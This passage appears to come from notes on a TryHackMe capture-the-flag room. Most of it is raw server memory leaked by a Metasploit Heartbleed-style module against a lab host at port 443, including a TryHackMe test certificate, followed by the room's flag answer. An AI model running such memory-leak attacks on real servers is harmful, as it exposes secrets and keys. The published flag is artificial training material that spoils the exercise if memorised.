...u.._I)..O..%.".....Gi..j..pE^.xi..m.7.*t;.....D.Y.U..{B...1|D+F:....5.s%...oG.8.uOS;..vv.....A..p.^9...pC...T.....!sb.......].L._..V..<.....c\....p.e...M_C0%z,.2...g..N..B.g....B.w}.g#..}}-Z.x.e.X.1.Dg..HdF.<.09.:....K.r.....c....&.L(..c.....H.lm.}1....ZS..f..a...Z.{....ZA..<.p..+....[.Y....(L.=/]..n....op.i.......y_0..+b....cjO..C....(!.....4..]..=I...].s.P.{T...b.sL..Jb.sgMXY...nQ.nNo.k.1.......zs..p8..%L.3di"D...5n{....0...Fm.;`.0.mD.j1.!e;...]b1x^&.....r.........V..sk..0#$hHS...5...Z.6-1F..J.U..rq.~ :/.....x.....o.'8)..TU..@....x"-...........~.'!..up_T.Q...Jj..q......T.:........j.Fs7.)...d].8.s]..5...Q.>...=....^p.......S.Di\.Ga..v...T.`{..o6...P)..`....Q....l...M.Gp.7..Oz.._I0d....a..\.w..p.......,..e.....-..(.N{.+...........eP.?..+6.....<..v...d|Ie...Q....=.l.Y.5B4..^($o.'z.........u..(...y..Uy..GU..J...z...}...)....jR.&..v...J....1..I.X..<...Bi. .Q..t.K............|.E...9..|3.+....]...M}z..n..NKT..~cK.F......m.9..ZH_.v.g...%.K6.......v......21.>......W;...P.3..[.4..!...c-......y..VQg.$....d...C0..<.d......._...\|.....<.sW..%....u......."....f...Hd..Ly".?.6..Q"b.&W.71.\....j.(/..;9.>...*$.+.....a....:7.?.n...J.......%.....a.,P.y....(.m.3..M.......8...8.X,.>....P..Hy..(.O.{_..|.t_..x..C.Y..&....F......3.-.T..qZ.c'h.g._V......../.0..$.j..d.t|..;7.Js.+...a.\O#...I.(..J.......\{..usux#....}...%vg....ML........(x..bG,.&..._...Q.5P....e..h.....M?.....a=......$.4g.1...D......yZ"..H...i.rnr.l6Ei.....}#>.....%.T....l.U..U..p}...{.....D.?_t..<..."~...*..T..3.*<O...)..w]FE..{...N...@.y..n^.XN.T.Tj...M..-....gV...|.j.]...V(...n..........[.....X..|..K.H.![.~....}..a...u..?../..n.9.V3\....fQz..n1h.:._....>K..y.T..\..9.._i.......p.`..&.....R..}.......Zwm_....%p.0...u.#...|...S......4....-..y..z..%..x!rp...IZW.......1F.o#+.....y../...k'....:Y...i.,,.UUr.....<$..v.....,en..ajd9....X..t....?S6B..:[..zb.........O.........?.P..9r...a..;...h<..................................................................................... ....... ...........~aM........>7OH..o/.eW.B..R.D5.~&...@......{...H..H~.S.8...t..?.....!/...C..#r..I...a0..|.AW.q}.....+kN....s..\.\...].....<..V....M=&Rl.4..Gi...?V.....W.....).x...Q...-.t.........n.!:..\.1.k....o..]..Ci.......Q..L.{.o'.i..+.^......4:..{-..h..T.X......&.......-.iEk/.-......`...1#...9G..3../...Gm..\.rx......!..............l Z.....d...S..5Y....f.u.iKf...;..n.....b.2!...l.........f..|(.|..............a.$N.k.'^.L..k.yE..E.@...8.k......?.W&.i...m..@J1.ic.].. .|Z.xh|v...[.]$.w..'ba2..g..FhS.h....m../}....x.]....&.......W....;.ic. ...O.....m...c72..#o..zWf..g.1XW......_.Brg-t=....56.g.h2....pVQ...nO.W..ScV.....B#I.c.#0..z...2.}.....%..x..n..&(.....P...S....y9s7.O..n..SJ.C..d....y.V."@.%z~..t$...V.o{.5I".....SA0......G(......TOF....|s......#X.u......=#.......[..Dw...c..%m.hoM.  H2o.<D..D...}....Rj.#..7..$..W1y@.}g.]...7.........7...../e0Cw.#..t..j:../u.r...{AN..0VP...B.U....(N..5.`V.z.YY......PQ....6..y...6......}.8.m.K..1H.}._0m..[a.t........F....w.L.......F....v...z....I..I..kZ.K..s.o7$V..0G...k...y...|E......B.0...Hs..W......:z...M..|..~.W.....6.b.&#I7.g..R.....C..V.Y.Bm...vK..:'./NJ....z.Q..ab..~y.*b7..........A.QA.E.q..@,aM#rb....R...c..M.............J...[. .|....c..............~.R......Z...J...{.y|6.."E.j....d.....XH8f?....p.U7...{.JO.#;.....|H...]...........A*......'....Iw.Y.........7?c.c=.....I{....+cq!.[.......xT......O...q.....*A..W.6%....G...N"v..?...'...$G7....W..3K.NB..A..D....pBj..../......vm...@:@...g..1R.#X...~*.......F,I..E......@.#.i.`....R..G.pf7u...:i.K.#d.e...'.w`...y..5sjO&..&)R_......W...#..[.......:.l...H..z.2....."1.c......E.S...4*...a|.}...}..0mX.KZ..X....^.^..Sx.......Ib"[.g..W.@....v..Mu.AX.C...r. ....m...0....Y.|K..).s.....b.=e.N....zbc>....&..n..fz}_.......l`.C...q>....4.4z.,......q........yf5k.|....F_..m8Lg.8n+..-..dq0x.mB.Z.K..W.....r.Rz..F..:...j.5...$lj..H...Z..D..w...G......sV.. .........9.c.r....!URN.i.lcTV.u......u9/}...J.J#..N...g....e...+D.'..C...yz.:..1.A.aq.8~@.'.._...6...fn...'.\8....5.~J.'.#...n...0..X.=.3..._....0...[o.\.r..M.....(.M..G..............~....N.S..a[............L,..{.V.."....B.....8.....n.j;_|*q.g...H..]=f....._s.ifcE..M..w.X.;....&......+..H......&.[e....r.4.l..&b....aL.......$...j'..r...8S....j^+.........f..<1w.6..Wn......A.y}..Q....G.......V...:..J..wy..B[..R^.....E`TC""..-.w.,..o{A.!-BD.V..w........q8.SxN0.lz]....Cbk]k0.P.A.6#........N......|...).l.*.W..W..h.[$.W..?...=..)Rl.ycyG...Nx`.8.....-).....Y.R...+4Wk...q].A%{..7w.Y....0._..?."....u....V.z..m.)......x.lU...|......>./Z?..|K0Cw.0.Unl.M.g-j...lDK.HN...}d..|..g..( ....o..J&...03Sg.9g...Bxn..C.....z....v....)..."..b...o...T..5..&yQo>..w.#V.......>.-.....0....b....mKX.....d.....7..R.f..Z. ...,b.S.1.....9/._.zb.).0........R...{.D...L..L..>...?.}..?'.'m.'T%]u.r;..k.C..<........F.s...1}ay....{@!C^\...k.....:b...).o.2..P.....#(..f.....}....1....T..Y....|....GL.]_Cb..?w..."...{..AD.y.....Ev..E}(./.....v$..'.q..U..|C.SJ.....>qe.wy....!....d^...........Q3.cz`.a.....:.J.^lN......... ...^.q.3..Q.._..A.v..#y.@..\....@........[....%.5I.#>."A../^.]............p.K.9L\...d.....z..X}S.:.-.../?..._.&.....*!{.....{..^`.....7wq....C.T.v.5.....n~ .....{........_......*.9.R.7.....wLQ.!Yq.KQ.q....*..\..}....Jm..#>..*+O./."....C.s{.....H'n.b.,j<#i.U.....W.U.'....N.........^.8YA:...`....-..HP..y7.?i......0...iK.M.j+.......L(...........u.K......J....1.z.,'.Fq..l...<@~...%..hl2.............~.....]..z/b.6..apY...dm.#...'d......w.V.....).....7...,Da.|I....L{.02.Kw..|'....JLQD..[..At`.....>N.....n.7'C[.p....A..W.2....:..o...&o..U..2..%{...q.a...._.D*...Lg.={......_....w.bd..b$...[C...4?_.x....4N\.BO~........pvr.U....Q.....3.Tg... .?.b.>.n..a..%N.........b.....>A...,.R.!.t....*..m0b. ..p.....r..{.MY.C.Rc.L%............~b;.j#.b7..*.i.e.x..&..L;..T...Pb^..h....."0.....*M..q$...zr......g.X.O../.....#....:.d..?...+.\.h..8..&.&..."F..N /...XQ.(B ...R9b...#Z.....$$.....v..[VD.s...............hH.m>_/.G.l...9.-TB<....}..5.>...U..%<m.~}.ri...;..K.{.(.$..7.0...}...8LPy.....w...k..zT.......AwvRL..!D.3..g.../..I.wZ......%.+.............$.~.c.R.Q.|....."....".....Bz$...Q_...........l..........kVO.YO0..Z.n.N..,..Lf.........+..........@..........V...R...P7..&.....95....L..Me_.aR..{.m. %[...Z.+...Y..]o...V.Z9.9..o.8................................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A.<-.nD.........{fPgiv....S....-{gz...Cb.n..\.C/@...[O(.f.S,.J.cm3..<5...R.*;.#N.L.J.1.h[.+K..A...Q.....&....4.|n...<.<1M..e..G....[op%Xp.?^...O.NLG-.io....+L....9..U.-....^..Y...i.....T.....@..jZ..|..5..{+bH...:o.......`vr......&r..o.......,"G.x5.UY.>&..sar.C..i.B#...D.SN/......%.]...@B.`..#.Y\Jp.K.1...J5y...........X..{s..............*....x.x.+.....}U..l...i.^...h...X.)..;..#..8[...`......z0%4..`..h..C......Ei....a.>.(;.uX..*..~V...+...7Tg.X..y..Z}..<.:.3........d*.....~cS...0@r..~`..............?.o.k}...AC.~-......cS....\..IR1.....4.....KI....n../.n...N....A. W...|#.......M.G....._..]............}..t.8..U....~........2Sz.j.v..Qj3.D.q.D).`..e.Q.....:..b.0....0.E.5Z..D.Akf...m.$(....K..(..F........?.H.ae....Mh?^$Pz....hHMi=..a..h.).fV2....|...........<......_P...[...../a/7&......K..v{....v._>.C!.Am.^.RL...*..v.^.:..yx.....Q{.G*..${.....P..d...z..-H......!....;......dj).haC.....5!...~.].}....>.............~A)E.A.Fn~O7...?..l...J...>.1.|.....7...C..&.._6#1FV.g.xC....P......gl...A....~..u....z.dY.....3i...z/..{........#CX&.'..O.._d..J...E?..L..Tj...xn..odbC!..XI......8..........%.N.A......._.............^^.4c.'w.(.Y.J..wz..Mw?..h.Z.Y:'j......w._......b..C....c...p...P..F1kL..B..c..........P.i..o..3..Vk.P.Y.Q..H.?............."}...M.b.&.i.>Q;.+.^..Q_.#w{hw.BB*...Z-T.7.9JW.]..Vv.c,..)..H.....l+...5..t.FK<M.:....{s._.D....UI.L..._...../...b..e x..~..*.......b*....x..FX..&%.Wubf#........L[...........4}D...7.. .....f....x..v..../...H.q.Z......w.O......3w.S...g.._M.7.wvz....\.yn...%....Yb....;..\H...C.:...0.}..i.$..L.R{......./.K..M./.0...m...........0..v..'.....u.".o.=..........\#.m. ....o.$..M... r_.]..9ic;8M...a....L+w.........!G......O......5tg.`...|....y.......pB6(.:x...]1..#.f...V..0A.......`...m5oJ..n..../'.....n.=....NK.....].).D,#.@.....f...B........8.=...p.....$Q.=....X..F.......}..t#.z.'..EO...G.(K...z.W..V]yw&...1.'..E.4.h..*QN..O..#....a&...O.....]Z...LGk.<T.......#..-.XV.1...j..(.J....k.N\.e.u".. Y2...aq.c...\.S.&b....XB.qR#./.....A.w....K.y.O...@H..C......E.....m..N.Q_._&[$.{7.<.....1.%.Ba...tHvli...q....T...F....U]UUE.:...]....p.0%..=.....{.....`...D.../...6...V3]<v.{0".m....jW..e..H.{.....^...`.D.....z.N.?......[yq..'35...."..@....k.&...7.u?K.....n.w..!%....2......u......^C..\.W[.)A....`<N.4....'....zu]........S.....a2.GK..9.\.g..2...... n...31e.......&b>....C..DA.....Zsn..._...W/?...o_......4`.@.6...).U.:<|.-...1;.......@...d................?pC.B..N.....x.+...0.:.U^).T\...#)....z..XZ...8......U...I.%....\{.qr...vu.6..?AP`'......5....#.].T.{......xh.....&.G...;../.G/.+..0...M.M....2.n...&m...)5j...Nw..:....P|........C).l%.7..&.+..O.M31;3.g.Sb...n.#T...U..*.i........r.....5U.TX...n......A.@W.&.w...Q..x....k..?..b0.x).xj...>.J.....;..'..........V'....6..Z.!.1.x...y..g....B.../.........D.:...k..^z...........i^;..v*.j.,Y.+#.f.w.q".....AG..B.....BB...b.G..P.;{..|...........%.#........$x#...[...R....E@......K..Q'....#.........Y].Qp.@k.....6..|...}.U.'M...&pv......'....J..>.R..f:.dS.....B.;..*&........<! ..E..,%..u...;...)~.|..6e.Ba..\....t/.....k{................>..%...a...!..+[M^....u..}.ww[..L..S........Grb/\......-.8.....^....\....K+.F.</X..9>.......t.....wwn_R.}....=E.......:.d.sCtR..........&..,.gn.U_.&.R.+.N>Ln...1....|\..'...R^D_5.G{[.W.."s.............(.w....G......H....$.......=.|..$........X. w.....(M.f<6...5....e{......aP......1........*....C.......'..9M..o?....K..O\.\9~...c....._..S8.........y....$??...]|QJ.5..7...7.)8x.V..#t.].8&..K.!ze...I.I).b.....*...._..+...G._.a<M........YT_zR..-.1+....4..=).....N_...fqpR(.d.J..=...r....e.A..lpWw..{...Q..7 .5... 1._.....<1....%.........,..}\..C....%..7.X`.\......P.$....(...}\.^....l.......9|D.&PB..r.E.I...$&F...]Y~8.........9}......&(f..0,......O......sR.D...........&*... M....i.B...V........&._.+.....+{...7S(....g!...a.mx...L.ky.(.....2;....)k.5._....z..L........._..o..O...p.@........>.C0..w....[...8.;.$....M.B>.*......2..q.R....N[T...........*..?.c......M...V.......Mg....f...v-.&R..e.c.C>M....c+...r8'.A...?..<.n .9.]..,[......ORb.{..@ZCr.....An..OBgK.=.....<R.J.O....KR..:..|....z.&L.'.... .Y......n..H{.Du...k...q%.......Mg.;,^.."K..0 ..u...... ....u.$.../*..-..........=..0%'<.w......"...KW....N.p....2x.0.... .....)..yw.]...-.N..'...8....CJ.~P.".Qb.`@.].=...C.j/..L&_u]...c.xbQ..@.....9."C....f.\..q..W.W...~........c..:....-...\..._..-..6_...Z.T]X..Q|.........y...O....x..2Y.....{..xCOG...h.~./.wb.n.}.&R..VK.'.H...K..4..}......%..q=."...K..b]...-V..A.`..."N....OT..G)f.]...Z...3....#..r.D.b..lj.r$.....y.S...Z...'.N._...?~....x.W.....H.mR.8H.;....JG.nn.q $o...hD..5.8.....S4@.]...(...4.r...-X...!MX......{......V\..}.......@+..A8...~..+z.^..Qg..J5....C.D~..uvk.....{qD...+2..7.$T^=.....a~..<[(TS..).W......A... h..N'..nK3.?.c....x.&&)......&.`....A.`W...G........d{}..v.......;....w.WZ........^.e...w."..........LC/i..4.\."x.....r.TOq9.6.............L....[V...d.~`......?~.c(........e!uZ.4ag...S.bZ.rD....(@...<(.....{..CCS....D......Ttd@8...pN.L......3vG...K..e.B.uU[ ....*..^..J...r...+.Sy....k......L..."YW}.rb3...D.{.e(...A..KK.=..H;.......y..ai.4e..H%Z........s.Y1W.U...L1.."..p.......w.1z..G..K.O..O..D..'..0.+.N...d......h..../;....%3.c%.....z.7..2..o&}......ho.....|{.R..Lr...l&b.$.../..... .}H,.{q..2...u.(F+w...6!p..w(...}...-....A.;....n.....&Qg.K.5...X....!/..$....X..N....Kj.}........T..~..E.... .<..?...|..@..^i\...N..a.6.j...(...wc?..1..^...z...Z.S..n.~(`.{u.a..u...;.......S,..S...Z..q<....`@..E.u`.Q.....\.vA...%................2...J;._.....`..V....8cU....|43.........BG].n+ct...........&.n_.,.WD<.Wgz....G.U(./.....@P%...c...Z..F.Z4._...}.4..U.....;..T.....+Q..P.~>.............;...H......e_.D..O=..".....i..8.{.Bd?....... .`..;.#A9.....Sm...?......... .`..9.OZ..".I......<#...V(..:n^...{...o....... ./.V..1.........L...".../..su.lQaM.A%...f.A..x.R.o.YBq!G%..."[...|.. ...Y+ .R..O|H!....L!..}.,...8.xO.N.Y..a......P.6......e:......:..R......#q#.!...w...MO..~.r...>.........i.......&C;.. .....|......Z........._....z...Q..c.'.O.....).!..0J...0......6..@.%.[;....../|..V^.mJ.l..$.Me.,.g.#.<*.Y.z.....>.....^..C\.$......[...?......>.....G..aX,...6..xt..B....{..........w.pBmk..\...i.K...Yd.........ge...ID{.".......x*.$.....^ci+...K.@..#........N.....>..l....D....b0r...u< jKW._k....h..^.u[.b.5j.?.8.!.z...5..x.B.k.<XJ.m..F.'Z...F6D..../..V6..B,.lL@fIQ.B....O,X..=......5...m..7.!.qx..x.1....@.kZ..4ye.W.8.......i...,....\XO4{[..c^..y...4..'.:.....?.Q%{....~*..@.......0rbA.<`@#g.................g>x.7....1.+.4.........q/{.,..io......?N..c._.B..D......IXF....].k.>w.4..).U..(.a7..... B.....^.u$T..<;0...#..7. ...;......N..I.....W......m.9..3..c.../.........&Bf'..).D.,..-...... .....`...&..........'v...Q......:~...5..._.......-....\Qi..LB...d.{.?.Q8.n....(....Pw37.@].,H]A>...C..O.....4$..."...._...2..{;3.4.P...p!.T....Q... ...oK.UW....v..."6PD.B.m...=[P..1..'.....'.MI.h*.m.IuI.O[..U.r._...~.w.~/.l+........a~/....{.:....W....`..`.P.v.p.....,n.\._O....x.h.&...:.WWA^._~.I.[.6..S..lOQ.J.%6.H.4..G......1'....t0y..<....#......N#..........l....ww....P!PH...D..Ry=E.y.....I7..?.-N.....G...!.T..].Q..H1.7wD...Z.u...p....E/..0.l.Q..&..X.YRM.$.....2.l.....U....z_I.._..^..]w.Cd........J....w.uuL..L...7xh..t].u....."...e.xG8ev3\.3.h.f...LJ.{h......^1.Z@X.p....vx..NrE.j.p\.....e....e.qb.pfFhF.f..s.!../..st.3..a..X.....\....Y..x.4.....1.A.....H*.q..Y4..... .!...B6A......)..!.T......\....F.`.....7.V.Pj..[.MM....T9ul7......Q..DY.8.5$9C.]..^Ls..BgY......[..g(..s...5.`..DDw.j ..6.M..w..q..6...gy..o.[...h.!....:...*K..a..G.Q=_j.1.....Gw...-.*.....W ...54....d.......vK......Q../".A..vK.)..?+.3../g-.AB.GET.s[[..z..8.......................a...........!.T..... .H"B.i.YG.#Y.i........@......V.8..m...x...38!.\9.........[....I-.....6.8..U.0>....Yd.X..ok..j..)..0..../.Q..y?.6$..FM^.x+b...."4*:....d... .P..z.q.....rbk.F..i.z.......4..X...L.|:P."_;..F0.DP~d.`g;c..5B.h.9......J....8..:4.J...Mp.....eb........@.}..=...c@..m.B.?7ls)6u.l.u..o...).@)V..K..!.T....B.P....y/...d...l.............*...y..1;.........k............d......9.\.P..@r..$.F...C..Pt 2>V..............R.Z....0..E....X..:..?{.X..&.Q^...ja.../......^.5B^kt.].*...i..q=..%6vI......&v).....Y.)A\......H... .0.6f0..d..q..U" ...+n.o.^...8Y..!...N...-......%`........H.J...t....S{...._z..k..{.(....1F..l..~..($..7Q6.....!.U....bB.Q...h.."..l......X...}.%.5.e...Ao-...+...h.SL..|..6.*"...'.......v..p.J.`.D}...{.v.....|...P.I2...Pg.v..*......'|.s:.=....J2.[..%.J9b.../+..O.+|.Q9.........z..]..;..5.I...=#.h...f]...{.w.v.U.-......?N........J.=...yv.I.Wz.x...U...o.k....f.h,...q..|=.J.X..pw....4.^...5.$...-.s....0..i...v.. +YXz.....4....6..]......0bu.z...].!.U...,A1........@-..4.M.....zbuq.Fd.#H..-..n....D...?.L.>.8....{...6.JX.G.p.fTv...j."..0.......Z..^.......?=....$....e.:...O..>.2...O..3.C.]...i.~'......r\..#q[.$....`?f.d...R........3.w.2.V.......[...@s-..."...........c....r....9........`j]......hH..!.U.....0....VE..J$.K^.......>.BCs.....h..\.....&d-".....J..SO.Y._.h..Y)q.$`..C5..9'4r.3L$*..`.PP~.R.m`..! .......f._..w.....5...4.M...i.{..Kxb..I..Z.......+...2.@gPY.......!.c+...;qO.........k..%.j..wn..<.1%....%.r.....Sb$.j1v..a.. s..CplZ..._..}.6....!.U....B..H....3n..7"..Ke.......!-...I5.:.h.,>.N.0.Nf.P.4.......|..!.K...r...j.....@sM&f./..|.w.nOqq.....^D..z.;u...0.n8~...?t.5.`..M".G.UUq...'A.gs.J.E.Rj......Z.......[...3...J.B:..!6+......D.1IkM.......3.....f7..&....5g..4..D.f../.*.N......e......%......EW!.U...B`.Pl.....A.......H..e.@.....3.....grM..@.'"g..2M..*..<?..Q,$e..8. .l.._........1....PQ..'".....5.rmL.6..#....)..g.+...Pe..a.^S[.2..V..........n..i...>.d.b...)....*....~Z..h....}U..q....W.....svyVYw..5..y......1W(.....z..N.n.L..<...D....at...bP .9 ..9.^..i.).h.....fJl.!.T...a.0P....8...P.......>)....eu.........8.w3.....`.....LXq$.Z..9m.....^..c.).....j..rAj.....o..|Z....d/0o.yT)G3.........F.........{....V....M.....,1.....$23{Z.p...J....aE...)k..'........L$./.........2......i9L.....u........... ......T~/8hV...l.E..u1..R.? %...3B.!.T...$A.[.a.(.uhYw..-...;./|J.....L..E:.....#t....|.<..u...58#... ../6...F......|.......g.P!0B.f.Y...x.^...(dt..Bk..........~].........8B....R....~.Z...mrg......wZ......09%.n..H.T...... ..|..tP.%..3..@....`!. D...............-...N..pW..a.x...<..g"..El$.-.b...h8D8!.U....A..0!.K...Ak\.T.;..W.dYo.......XIK.......%.Gr.>..7.....)...N..#z:...+.d..(`...H.....;.\.O./JA..b.w&4.N\y.0.D..F.......{.;$. ...y..z..G-.E.f.....'C;. Taq..u.v........Y.i.. ^N.\(%..d.2.......Ie....:5..R..e...n..\...j..Z.$I..S(<.....Qj% *..&RJX.0...<..c..@...:..F`M/...,U.4.`QWX.!*T....a)...*......WD.m..G.,`m.v..pX.........rc.N+........$D%7.h....7........{....J5..(^....|.}..8...1.J.e...X.@....m..........._...k^....ya......S....]r.Y/..G..2H-p.'_.....w&...@..AB.YU.e5..!.x.w..>....|i.%k..w.G'...q...?.*...W1\.z5....?...i-.HF....%. ...6.:.....!....!L.K...X.l...m0.l..P...!..hx..(...f=.O..`z....h...`.>.Z....i.a<......n..S.><...3k.*:I....+............m....s}.k.,..~.....d.......j.oPA...;..vi..u.%r..._J...|(.2:.CdH.....|".....$E..[.g;E........9U&.L"
[*] 34.244.244.152:443    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


What is the flag?
*THM{sSl-Is-BaD}*

[[NetworkMiner]]
